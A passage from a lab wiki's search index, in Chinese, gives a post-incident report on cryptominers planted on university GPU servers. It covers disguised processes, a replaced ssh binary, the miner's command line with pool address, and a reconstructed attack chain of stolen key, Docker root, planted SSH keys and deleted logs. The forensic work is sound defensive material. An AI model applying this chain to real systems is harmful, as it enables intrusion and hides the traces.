<p>\u200b\u89e3\u9664\u200b\u6302\u8f7d\u200b\u540e\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>nvidia-smi</code> \u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u540d\u4e3a\u200b <code>Xorgs</code> \u200b\u7684\u200b\u8fdb\u7a0b\u200b\u6b63\u5728\u200b\u8fd0\u884c\u200b\u3002\u200b\u8be5\u200b\u8fdb\u7a0b\u200b\u663e\u7136\u200b\u662f\u200b\u4e00\u4e2a\u200b\u4f2a\u88c5\u200b\u7684\u200b\u6316\u77ff\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u6545\u610f\u200b\u5c06\u200b\u5176\u200b\u547d\u540d\u200b\u4e3a\u200b <code>Xorgs</code>\uff0c\u200b\u8bd5\u56fe\u200b\u8bef\u5bfc\u200b\u7ba1\u7406\u5458\u200b\u4ee5\u4e3a\u200b\u5b83\u200b\u4e0e\u200b\u56fe\u5f62\u754c\u9762\u200b\u76f8\u5173\u200b\u3002</p> <p>\u200b\u67e5\u770b\u200b\u75c5\u6bd2\u200b\u6837\u672c\u200b</p> </li> <li> <p>\u200b\u9690\u85cf\u200b\u8fdb\u7a0b\u200b 2\uff1a<code>/opt/Xorgs</code></p> <p>\u200b\u4e0e\u200b\u7b2c\u4e00\u4e2a\u200b\u8fdb\u7a0b\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u8fd9\u200b\u662f\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u4f2a\u88c5\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u7528\u4e8e\u200b\u9690\u85cf\u200b\u771f\u6b63\u200b\u7684\u200b\u6316\u77ff\u200b\u884c\u4e3a\u200b\u3002</p> <p>\u200b\u67e5\u770b\u200b\u75c5\u6bd2\u200b\u6837\u672c\u200b</p> </li> <li> <p>\u200b\u9690\u85cf\u200b\u8fdb\u7a0b\u200b 3\uff1a<code>/usr/bin/ssh</code></p> <p>\u200b\u4ee4\u4eba\u200b\u610f\u5916\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u66ff\u6362\u200b\u4e86\u200b\u539f\u6709\u200b\u7684\u200b <code>ssh</code> \u200b\u6587\u4ef6\u200b\u3002\u200b\u901a\u8fc7\u200b\u8fdb\u4e00\u6b65\u200b\u68c0\u67e5\u200b <code>/etc/ssh/sshd_config</code> \u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u6211\u4eec\u200b\u53d1\u73b0\u200b\u4ee5\u4e0b\u200b\u5f02\u5e38\u200b\u914d\u7f6e\u200b\uff1a</p> <ul> <li><code>PasswordAuthentication yes</code>\uff08\u200b\u542f\u7528\u200b\u4e86\u200b\u5bc6\u7801\u200b\u767b\u5f55\u200b\u3002\u200b\u4e3a\u4e86\u200b\u5b89\u5168\u200b\u8d77\u200b\u89c1\u200b\uff0c\u200b\u6211\u4eec\u200b\u5728\u200b\u6240\u6709\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u90fd\u200b\u7981\u7528\u200b\u4e86\u200b\u8be5\u200b\u9009\u9879\u200b\uff0c\u200b\u4f46\u200b\u5982\u4eca\u200b\u5374\u200b\u88ab\u200b\u5f00\u200b\u8d77\u6765\u200b\u4e86\u200b\uff09</li> <li><code>UsePAM no</code>\uff08\u200b\u7981\u7528\u200b\u4e86\u200b PAM \u200b\u9a8c\u8bc1\u200b\uff09</li> </ul> <p>\u200b\u8fd9\u4e9b\u200b\u914d\u7f6e\u200b\u8868\u660e\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u80fd\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u7279\u5b9a\u200b\u5bc6\u7801\u200b\u767b\u5f55\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u4ece\u800c\u200b\u5728\u200b\u4e0d\u200b\u4fee\u6539\u200b\u4efb\u4f55\u200b\u8d26\u6237\u200b\u5bc6\u7801\u200b\u3001\u200b\u4e0d\u200b\u5f71\u54cd\u200b\u6b63\u5e38\u200b SSH \u200b\u767b\u5f55\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u957f\u671f\u4fdd\u6301\u200b\u670d\u52a1\u5668\u200b\u8bbf\u95ee\u200b\u6743\u9650\u200b\u3002</p> <p>\u200b\u67e5\u770b\u200b\u75c5\u6bd2\u200b\u6837\u672c\u200b</p> </li> </ul>"},{"location":"ops/security/#lab-server-intrusion-mining-pool","title":"\u5bfb\u627e\u200b\u77ff\u6c60\u200b\u5730\u5740","text":"<p>\u200b\u5728\u200b\u6210\u529f\u200b\u89e3\u9664\u200b\u9690\u85cf\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u6302\u8f7d\u200b\u540e\u200b\uff0c\u200b\u6211\u4eec\u200b\u8fdb\u4e00\u6b65\u200b\u8ffd\u8e2a\u200b\u4e86\u200b\u6316\u77ff\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u7f51\u7edc\u901a\u4fe1\u200b\uff0c\u200b\u4ee5\u200b\u786e\u5b9a\u200b\u653b\u51fb\u8005\u200b\u4f7f\u7528\u200b\u7684\u200b\u77ff\u6c60\u200b\u5730\u5740\u200b\u3002\u200b\u901a\u8fc7\u200b\u4ee5\u4e0b\u200b\u6b65\u9aa4\u200b\uff0c\u200b\u6211\u4eec\u200b\u9010\u6b65\u200b\u9501\u5b9a\u200b\u4e86\u200b\u77ff\u6c60\u200b\u7684\u200b\u901a\u4fe1\u200b\u76ee\u6807\u200b\u3002</p> <p>\u200b\u6211\u4eec\u200b\u4f7f\u7528\u200b <code>ss -tpn</code> \u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u670d\u52a1\u5668\u200b\u7684\u200b TCP \u200b\u8fde\u63a5\u200b\u60c5\u51b5\u200b\uff0c\u200b\u91cd\u70b9\u200b\u5173\u6ce8\u200b\u4e0e\u200b\u6316\u77ff\u200b\u8fdb\u7a0b\u200b\u76f8\u5173\u200b\u7684\u200b\u7f51\u7edc\u200b\u6d3b\u52a8\u200b\u3002\u200b\u5728\u200b\u8f93\u51fa\u200b\u4e2d\u200b\u6211\u4eec\u200b\u53d1\u73b0\u200b\u4e86\u200b PID \u200b\u4e3a\u200b 18790 \u200b\u7684\u200b\u6316\u77ff\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u4e24\u4e2a\u200b TCP \u200b\u94fe\u63a5\u200b\uff1a</p> <pre><code># ss -tpn\nState  Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process\nESTAB  0       0       xxx.xx.xx.xx:35126   yyy.yy.yy.yy:8010  users:((\"Xorgs\",pid=18790,fd=101))\nESTAB  0       0       xxx.xx.xx.xx:56578   yyy.yy.yy.yy:8010  users:((\"Xorgs\",pid=18790,fd=102))\n</code></pre> <p>\u200b\u5176\u4e2d\u200b\u5b9e\u9a8c\u5ba4\u200b\u670d\u52a1\u5668\u200b\u7684\u200b IP \u200b\u662f\u200b <code>xxx.xx.xx.xx</code>\uff0c\u200b\u800c\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u7684\u200b\u662f\u200b <code>yyy.yy.yy.yy</code>\uff08\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u6821\u5185\u200b\u5730\u5740\u200b\uff09\u3002</p> <p>\u200b\u6211\u4eec\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>/proc</code> \u200b\u67e5\u770b\u200b\u8be5\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u547d\u4ee4\u884c\u200b\u53c2\u6570\u200b\uff1a</p> <pre><code>root@lab-server:~# tr \\\\0 \\  &lt; /proc/18790/cmdline\n./Xorgs -a kawpow --proxy yyy.yy.yy.yy:8010 -s 51.89.99.172:6060 -u RBgUjdBAXMSNtDgSHbCAvVdLk5vZNz9nNG.lab-server -w 0\n</code></pre> <p>\u200b\u4ece\u200b\u547d\u4ee4\u884c\u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u770b\u51fa\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u540d\u4e3a\u200b <code>Xorgs</code> \u200b\u7684\u200b\u6316\u77ff\u200b\u7a0b\u5e8f\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b <code>yyy.yy.yy.yy:8010</code> \u200b\u4f5c\u4e3a\u200b SOCKS5 \u200b\u4ee3\u7406\u200b\u8fde\u63a5\u200b\u4f4d\u4e8e\u200b <code>51.89.99.172:6060</code> \u200b\u77ff\u6c60\u200b\u3002\u200b\u653b\u51fb\u8005\u200b\u901a\u8fc7\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u4f7f\u200b\u673a\u5668\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u8bbf\u95ee\u200b\u5230\u200b\u77ff\u6c60\u200b\uff0c\u200b\u5373\u4f7f\u200b\u673a\u5668\u200b\u672c\u8eab\u200b\u5e76\u200b\u6ca1\u6709\u200b\u5f00\u901a\u200b\u51fa\u200b\u6821\u200b\u8bbf\u95ee\u200b\u6743\u9650\u200b\u3002</p> <p>\u200b\u5728\u200b\u786e\u8ba4\u200b\u4e86\u200b <code>yyy</code> \u200b\u4e3b\u673a\u200b\u88ab\u200b\u7528\u4f5c\u200b\u8fde\u63a5\u200b\u77ff\u6c60\u200b\u7684\u200b\u4ee3\u7406\u200b\u4ee5\u540e\u200b\uff0c\u200b\u6211\u4eec\u200b\u7acb\u5373\u200b\u8054\u7cfb\u200b\u4e86\u200b\u7f51\u7edc\u200b\u4e2d\u5fc3\u200b\u7684\u200b\u8001\u5e08\u200b\uff0c\u200b\u5e76\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u76f8\u5173\u200b\u8bc1\u636e\u200b\u3002\u200b\u7f51\u7edc\u200b\u4e2d\u5fc3\u200b\u7684\u200b\u8001\u5e08\u200b\u8868\u793a\u200b\uff0c\u200b\u8fd9\u662f\u200b\u6821\u5185\u200b\u5176\u4ed6\u200b\u5b66\u9662\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u5e76\u200b\u5df2\u7ecf\u200b\u901a\u77e5\u200b\u4e86\u200b\u76f8\u5173\u200b\u4eba\u5458\u200b\u8fdb\u884c\u200b\u5904\u7406\u200b\u3002</p>"},{"location":"ops/security/#lab-server-intrusion-intrusion-method","title":"\u6392\u67e5\u200b\u5165\u4fb5\u200b\u624b\u6bb5","text":"<p>\u200b\u5b9e\u9a8c\u5ba4\u200b\u5185\u6709\u200b\u591a\u53f0\u200b GPU \u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u4f46\u200b\u53ea\u6709\u200b\u4e00\u53f0\u200b\u4f5c\u4e3a\u200b\u767b\u5f55\u200b\u4e2d\u5fc3\u200b\u8282\u70b9\u200b\uff0c\u200b\u5927\u5bb6\u200b\u53ea\u80fd\u200b\u901a\u8fc7\u200b\u5b83\u200b\u5411\u200b\u5176\u4ed6\u200b\u8ba1\u7b97\u200b\u8282\u70b9\u200b\u63d0\u4ea4\u200b SLURM \u200b\u4efb\u52a1\u200b\uff0c\u200b\u800c\u200b\u6ca1\u6709\u200b\u5176\u4ed6\u200b\u8ba1\u7b97\u200b\u8282\u70b9\u200b\u7684\u200b\u76f4\u63a5\u200b\u767b\u5f55\u200b\u6743\u9650\u200b\u3002\u200b\u4f46\u200b\u7531\u4e8e\u200b\u5982\u4e0b\u200b\u51e0\u4e2a\u200b\u914d\u7f6e\u200b\u7684\u200b\u53e0\u52a0\u200b\uff0c\u200b\u6700\u7ec8\u200b\u5bfc\u81f4\u200b\u4e86\u200b\u6211\u4eec\u200b\u6574\u4e2a\u200b\u5b9e\u9a8c\u5ba4\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u6ca6\u9677\u200b\uff1a</p> <ol> <li>\u200b\u4e3a\u4e86\u200b\u4fbf\u4e8e\u7ba1\u7406\u200b\uff0c\u200b\u6211\u4eec\u200b\u914d\u7f6e\u200b\u4e86\u200b\u4e2d\u5fc3\u200b\u8282\u70b9\u200b\u7684\u200b root \u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u901a\u8fc7\u200b SSH \u200b\u8fde\u63a5\u200b\u5230\u200b\u5176\u4ed6\u200b\u670d\u52a1\u5668\u200b\u7684\u200b root \u200b\u8d26\u6237\u200b\u3002</li> <li>\u200b\u7531\u4e8e\u200b\u5b9e\u9a8c\u200b\u9700\u6c42\u200b\uff0c\u200b\u4e2d\u5fc3\u200b\u8282\u70b9\u200b\u4e3a\u200b\u5176\u4ed6\u540c\u5b66\u200b\u63d0\u4f9b\u200b\u4e86\u200b Docker \u200b\u4f7f\u7528\u200b\u6743\u9650\u200b\u3002</li> </ol> <p>\u200b\u6211\u4eec\u200b\u7684\u200b\u6392\u67e5\u200b\u65b9\u5f0f\u200b\u5927\u81f4\u200b\u5982\u4e0b\u200b\uff1a</p>"},{"location":"ops/security/#lab-server-intrusion-center-node","title":"\u4e2d\u5fc3\u200b\u8282\u70b9\u200b\u7684\u200b\u5165\u4fb5","text":"<p>\u200b\u5f02\u5e38\u200b\u516c\u94a5\u200b\uff1a\u200b\u67e5\u770b\u200b root \u200b\u7528\u6237\u200b\u7684\u200b <code>authorized_keys</code>\uff0c\u200b\u53d1\u73b0\u200b\u5176\u4e2d\u200b\u5b58\u5728\u200b\u4e00\u4e2a\u200b\u4e0d\u200b\u5c5e\u4e8e\u200b\u5b9e\u9a8c\u5ba4\u200b\u7ba1\u7406\u5458\u200b\u7684\u200b SSH \u200b\u516c\u94a5\u200b\u3002\u200b\u8fdb\u4e00\u6b65\u200b\u6392\u67e5\u200b\u53d1\u73b0\u200b\uff0c\u200b\u8be5\u516c\u94a5\u200b\u4e5f\u200b\u51fa\u73b0\u200b\u5728\u200b\u4e2d\u5fc3\u200b\u8282\u70b9\u200b\u4e0a\u200b A \u200b\u540c\u5b66\u200b\u7684\u200b <code>authorized_keys</code> \u200b\u4e2d\u200b\u3002</p> <p>\u200b\u65f6\u95f4\u200b\u7ebf\u7d22\u200b\uff1a<code>stat</code> \u200b\u8be5\u200b\u6587\u4ef6\u200b\u540e\u200b\uff0c\u200b\u6211\u4eec\u200b\u53d1\u73b0\u200b A \u200b\u540c\u5b66\u200b\u7684\u200b\u516c\u94a5\u200b\u6587\u4ef6\u200b\u7684\u200b ctime \u200b\u4e3a\u200b 10 \u200b\u6708\u200b 17 \u200b\u65e5\u200b 23:54:11\uff0c\u200b\u800c\u200b root \u200b\u7528\u6237\u200b\u7684\u200b\u516c\u94a5\u200b\u6587\u4ef6\u200b ctime \u200b\u4e3a\u200b 10 \u200b\u6708\u200b 18 \u200b\u65e5\u200b 00:00:53\u3002</p> <p>\u200b\u767b\u5f55\u200b\u65b9\u5f0f\u200b\uff1a\u200b\u6211\u4eec\u200b\u8bd5\u56fe\u200b\u901a\u8fc7\u200b <code>/var/log/auth.log</code> \u200b\u67e5\u770b\u200b\u653b\u51fb\u8005\u200b\u7684\u200b\u767b\u5f55\u200b\u8bb0\u5f55\u200b\uff0c\u200b\u4f46\u200b\u53d1\u73b0\u200b\u8be5\u200b\u65e5\u5fd7\u200b\u5df2\u200b\u88ab\u200b\u5220\u9664\u200b\uff0c\u200b\u4e14\u200b rsyslog \u200b\u670d\u52a1\u200b\u88ab\u200b\u5173\u95ed\u200b\u3002\u200b\u5e78\u8fd0\u200b\u7684\u200b\u662f\u200b\uff0c<code>auth.log</code> \u200b\u6bcf\u5929\u200b 0 \u200b\u70b9\u4f1a\u200b\u81ea\u52a8\u200b rotate \u200b\u6210\u4e3a\u200b <code>auth.log.1</code>\uff0c\u200b\u5176\u4e2d\u200b\u4fdd\u7559\u200b\u4e86\u200b 10 \u200b\u6708\u200b 18 \u200b\u65e5\u524d\u200b\u7684\u200b\u65e5\u5fd7\u200b\u3002\u200b\u68c0\u67e5\u200b\u53d1\u73b0\u200b\uff0c10 \u200b\u6708\u200b 17 \u200b\u65e5\u665a\u200b 23:53:13\uff0cA \u200b\u540c\u5b66\u200b\u7684\u200b\u8d26\u6237\u200b\u4ece\u5148\u200b\u7814\u9662\u200b\u67d0\u200b IP \u200b\u767b\u5f55\u200b\uff0c\u200b\u4e14\u200b\u4f7f\u7528\u200b\u4e86\u200b A \u200b\u540c\u5b66\u200b\u81ea\u5df1\u200b\u7684\u200b\u516c\u94a5\u200b\u3002A \u200b\u540c\u5b66\u200b\u8868\u793a\u200b\uff0c\u200b\u8be5\u516c\u94a5\u200b\u5bf9\u5e94\u200b\u7684\u200b\u79c1\u94a5\u200b\u540c\u65f6\u200b\u5b58\u653e\u200b\u5728\u200b\u4ed6\u200b\u7684\u200b\u7535\u8111\u200b\u548c\u200b\u5b66\u6821\u200b\u7684\u200b\u701a\u6d77\u200b\u8d85\u7b97\u200b\u4e2d\u200b\u300217 \u200b\u65e5\u665a\u200b 22 \u200b\u70b9\u540e\u200b\uff0c\u200b\u4ed6\u200b\u56de\u200b\u5bbf\u820d\u200b\u4f11\u606f\u200b\uff0c\u200b\u7535\u8111\u200b\u5219\u200b\u7559\u5728\u200b\u9ad8\u65b0\u533a\u200b\u5b9e\u9a8c\u5ba4\u200b\u4e2d\u672a\u9501\u200b\u5c4f\u200b\u3002\u200b\u6b64\u5916\u200b\uff0c\u200b\u701a\u6d77\u200b\u8d85\u7b97\u200b\u5728\u200b 17 \u200b\u65e5\u200b\u4e4b\u524d\u200b\u5df2\u200b\u88ab\u200b\u9ed1\u5ba2\u200b\u5165\u4fb5\u200b\u3002\u200b\u7ed3\u5408\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5982\u679c\u200b\u6392\u9664\u200b\u6389\u200b\u653b\u51fb\u8005\u200b\u8fdb\u5165\u200b\u5b9e\u9a8c\u5ba4\u200b\u6765\u200b\u62f7\u200b\u8d70\u200b A \u200b\u540c\u5b66\u200b\u79c1\u94a5\u200b\u8fd9\u79cd\u200b\u53ef\u80fd\u6027\u200b\u8f83\u200b\u5c0f\u200b\u7684\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u6211\u4eec\u200b\u63a8\u6d4b\u200b\u653b\u51fb\u8005\u200b\u5f88\u200b\u53ef\u80fd\u200b\u662f\u200b\u901a\u8fc7\u200b\u701a\u6d77\u200b\u8d85\u7b97\u200b\u83b7\u5f97\u200b\u7684\u200b A \u200b\u540c\u5b66\u200b\u7684\u200b\u79c1\u94a5\u200b\u3002</p> <p>journal \u200b\u65e5\u5fd7\u200b\uff1a\u200b\u653b\u51fb\u8005\u200b\u6bcf\u6b21\u200b\u767b\u5f55\u200b\u540e\u200b\u90fd\u200b\u4f1a\u200b\u5220\u9664\u200b journal \u200b\u65e5\u5fd7\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u6211\u4eec\u200b\u65e0\u6cd5\u200b\u8ffd\u8e2a\u200b\u5176\u200b\u5177\u4f53\u64cd\u4f5c\u200b\u3002\u200b\u67e5\u770b\u200b dmesg \u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\uff0c18 \u200b\u65e5\u200b\u300122 \u200b\u65e5\u200b\u300123 \u200b\u65e5\u6709\u200b\u591a\u6b21\u200b journal \u200b\u88ab\u200b\u5220\u9664\u200b\u7684\u200b\u8bb0\u5f55\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>systemd-journald[723]: /var/log/journal/33b5f48274e0432d922e5b5d97fa1071/system.journal: Journal file has been deleted, rotating.\n</code></pre> <p>\u200b\u4f46\u200b\u7531\u4e8e\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\u4e0e\u200b GPU \u200b\u6ee1\u8f7d\u200b\u65e0\u5173\u200b\uff0c\u200b\u4e14\u200b\u4e0d\u662f\u200b\u62a5\u9519\u200b\uff0c\u200b\u56e0\u6b64\u200b\u521d\u6b21\u200b\u6392\u67e5\u200b\u65f6\u200b\u88ab\u200b\u6211\u200b\u5ffd\u7565\u200b\u6389\u200b\u4e86\u200b\u3002</p>"},{"location":"ops/security/#lab-server-intrusion-compute-nodes","title":"\u5176\u5b83\u200b\u8ba1\u7b97\u200b\u8282\u70b9\u200b\u7684\u200b\u5165\u4fb5","text":"<p>\u200b\u516c\u94a5\u200b\u4fee\u6539\u200b\uff1a\u200b\u5176\u4ed6\u200b\u8ba1\u7b97\u200b\u8282\u70b9\u200b\u7684\u200b <code>/root/.ssh/authorized_keys</code> \u200b\u4e2d\u5747\u200b\u5b58\u5728\u200b\u653b\u51fb\u8005\u200b\u7684\u200b\u516c\u94a5\u200b\u3002\u200b\u6211\u4eec\u200b <code>stat</code> \u200b\u540e\u200b\u53d1\u73b0\u200b\u5176\u4e2d\u200b\u4e24\u53f0\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u516c\u94a5\u200b\u6587\u4ef6\u200b\u5206\u522b\u200b\u5728\u200b 10 \u200b\u6708\u200b 18 \u200b\u65e5\u200b 00:05 \u200b\u548c\u200b 00:10 \u200b\u88ab\u200b\u4fee\u6539\u200b\uff0c\u200b\u5176\u4f59\u200b\u670d\u52a1\u5668\u200b\u5219\u200b\u5728\u200b 10 \u200b\u6708\u200b 22 \u200b\u65e5\u200b\u4e4b\u540e\u200b \u200b\u88ab\u200b\u4fee\u6539\u200b\u3002</p> <p>\u200b\u767b\u5f55\u200b\u65e5\u5fd7\u200b\uff1a\u200b\u901a\u8fc7\u200b\u68c0\u67e5\u200b\u672a\u200b\u88ab\u200b\u5220\u9664\u200b\u7684\u200b <code>auth.log</code> \u200b\u6216\u200b <code>auth.log.1</code>\uff0c\u200b\u6211\u4eec\u200b\u53d1\u73b0\u200b\u516c\u94a5\u200b\u6587\u4ef6\u200b\u88ab\u200b\u4fee\u6539\u200b\u4e4b\u524d\u200b\u7684\u200b\u9996\u6b21\u200b\u767b\u5f55\u200b\uff0c\u200b\u5747\u200b\u662f\u4ece\u200b\u4e2d\u5fc3\u200b\u8282\u70b9\u200b\u7684\u200b root \u200b\u7528\u6237\u200b\u8fdb\u884c\u200b\u7684\u200b SSH \u200b\u8fde\u63a5\u200b\u3002\u200b\u8fd9\u200b\u8868\u660e\u200b\u653b\u51fb\u8005\u200b\u662f\u200b\u901a\u8fc7\u200b\u4e2d\u5fc3\u200b\u8282\u70b9\u200b\u6a2a\u5411\u200b\u6269\u6563\u200b\u5230\u200b\u5176\u4ed6\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u3002\u200b\u800c\u200b\u653b\u51fb\u8005\u200b\u76f4\u5230\u200b 22 \u200b\u65e5\u200b\u5f00\u59cb\u200b\u6316\u77ff\u200b\u540e\u200b\uff0c\u200b\u624d\u200b\u5173\u95ed\u200b\u4e86\u200b rsyslog \u200b\u670d\u52a1\u200b\uff0c\u200b\u5e76\u200b\u5220\u9664\u200b\u4e86\u200b <code>auth.log</code> \u200b\u6587\u4ef6\u200b\u3002</p> <p>journal \u200b\u65e5\u5fd7\u200b\uff1a\u200b\u4e0e\u200b\u4e2d\u5fc3\u200b\u8282\u70b9\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u5728\u200b\u6bcf\u6b21\u200b\u9000\u51fa\u200b\u767b\u5f55\u200b\u540e\u200b\u90fd\u200b\u4f1a\u200b\u624b\u52a8\u200b\u5220\u9664\u200b journal \u200b\u65e5\u5fd7\u200b\uff0c\u200b\u4ee5\u200b\u63a9\u76d6\u200b\u5176\u200b\u64cd\u4f5c\u200b\u75d5\u8ff9\u200b\u3002</p>"},{"location":"ops/security/#lab-server-intrusion-intrusion-reconstruction","title":"\u5165\u4fb5\u200b\u8fd8\u539f","text":"<p>\u200b\u6839\u636e\u200b\u4e0a\u9762\u200b\u6536\u96c6\u200b\u5230\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u8fd8\u539f\u200b\u51fa\u200b\u653b\u51fb\u8005\u200b\u7684\u200b\u5165\u4fb5\u200b\u8def\u5f84\u200b\uff1a</p> <ol> <li>\u200b\u7a83\u53d6\u200b\u79c1\u94a5\u200b\uff1a\u200b\u653b\u51fb\u8005\u200b\u4ece\u200b\u701a\u6d77\u200b\u8d85\u7b97\u200b\u7a83\u53d6\u200b\u4e86\u200b A \u200b\u540c\u5b66\u200b\u7684\u200b\u79c1\u94a5\u200b\u53ca\u200b <code>.ssh/config</code> \u200b\u6587\u4ef6\u200b\u3002</li> <li>\u200b\u767b\u5f55\u200b\u4e2d\u5fc3\u200b\u8282\u70b9\u200b\uff1a10 \u200b\u6708\u200b 17 \u200b\u65e5\u665a\u200b 23:53\uff0c\u200b\u653b\u51fb\u8005\u200b\u4f7f\u7528\u200b A \u200b\u540c\u5b66\u200b\u7684\u200b\u79c1\u94a5\u200b\u4ece\u5148\u200b\u7814\u9662\u200b\u67d0\u200b IP \u200b\u767b\u5f55\u200b\u4e2d\u5fc3\u200b\u8282\u70b9\u200b\u3002</li> <li>\u200b\u63d0\u6743\u200b\u81f3\u200b root\uff1a\u200b\u767b\u5f55\u200b\u540e\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u7acb\u5373\u200b\u901a\u8fc7\u200b Docker \u200b\u83b7\u53d6\u200b root \u200b\u6743\u9650\u200b\uff0c\u200b\u5e76\u200b\u5c06\u200b\u81ea\u5df1\u200b\u7684\u200b\u516c\u94a5\u200b\u6dfb\u52a0\u200b\u5230\u200b root \u200b\u7528\u6237\u200b\u7684\u200b <code>.ssh/authorized_keys</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u3002</li> <li>\u200b\u6a2a\u5411\u200b\u6269\u6563\u200b\uff1a\u200b\u901a\u8fc7\u200b SSH \u200b\u767b\u5f55\u200b\u5176\u4ed6\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u4fee\u6539\u200b root \u200b\u7528\u6237\u200b\u7684\u200b\u516c\u94a5\u200b\u6587\u4ef6\u200b\uff0c\u200b\u6700\u7ec8\u200b\u5bfc\u81f4\u200b\u5b9e\u9a8c\u5ba4\u200b\u6240\u6709\u200b\u670d\u52a1\u5668\u200b\u7684\u200b root \u200b\u6743\u9650\u200b\u88ab\u200b\u653b\u9677\u200b\u3002</li> <li>\u200b\u6e05\u7406\u200b\u75d5\u8ff9\u200b\uff1a<code>rsyslog</code> \u200b\u548c\u200b <code>syslog</code> \u200b\u670d\u52a1\u200b\uff0c\u200b\u5e76\u200b\u5220\u9664\u200b <code>auth.log</code> \u200b\u6587\u4ef6\u200b\uff0c<code>journal</code> \u200b\u65e5\u5fd7\u200b\u3002</li> <li>\u200b\u5f00\u59cb\u200b\u6316\u77ff\u200b\uff1a10 \u200b\u6708\u200b 17 \u200b\u65e5\u665a\u200b\u5165\u4fb5\u200b\u540e\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u6f5c\u4f0f\u200b\u4e86\u200b 5 \u200b\u5929\u200b\uff0c\u200b\u4ec0\u4e48\u200b\u4e5f\u200b\u6ca1\u5e72\u200b\uff0c\u200b\u76f4\u5230\u200b 22 \u200b\u65e5\u200b\uff0c\u200b\u5077\u5077\u200b\u5f00\u59cb\u200b\u6316\u77ff\u200b\u3002</li> </ol>"},{"location":"ops/security/#lab-server-intrusion-response","title":"\u4e8b\u6545\u200b\u5904\u7406","text":""},{"location":"ops/security/#lab-server-intrusion-mitigation","title":"\u521d\u6b65\u200b\u4fee\u590d\u200b\u63aa\u65bd","text":"<p>\u200b\u5728\u200b\u786e\u8ba4\u200b\u653b\u51fb\u8005\u200b\u7684\u200b\u5165\u4fb5\u200b\u8def\u5f84\u200b\u548c\u200b\u6076\u610f\u200b\u6587\u4ef6\u200b\u5730\u5740\u200b\u540e\u200b\uff0c\u200b\u6211\u4eec\u200b\u521d\u6b65\u200b\u91c7\u53d6\u200b\u4e86\u200b\u5982\u4e0b\u200b\u63aa\u65bd\u200b\u6765\u200b\u6062\u590d\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u5b89\u5168\u6027\u200b\uff1a</p> <ol> <li>\u200b\u5220\u9664\u200b\u653b\u51fb\u8005\u200b\u516c\u94a5\u200b\uff1a\u200b\u6211\u4eec\u200b\u5220\u9664\u200b\u4e86\u200b\u6240\u6709\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b <code>/root/.ssh/authorized_keys</code> \u200b\u548c\u200b\u7528\u6237\u200b\u76ee\u5f55\u200b\u4e0b\u200b <code>.ssh/authorized_keys</code> \u200b\u4e2d\u200b\u653b\u51fb\u8005\u200b\u7684\u200b\u516c\u94a5\u200b\uff0c\u200b\u786e\u4fdd\u200b\u653b\u51fb\u8005\u200b\u65e0\u6cd5\u200b\u518d\u6b21\u200b\u901a\u8fc7\u200b SSH \u200b\u79d8\u94a5\u200b\u767b\u5f55\u200b\u3002</li> <li>\u200b\u91cd\u65b0\u200b\u751f\u6210\u200b\u5bc6\u94a5\u200b\u5bf9\u200b\uff1a\u200b\u8ba9\u200b A \u200b\u540c\u5b66\u200b\u91cd\u65b0\u200b\u751f\u6210\u200b SSH 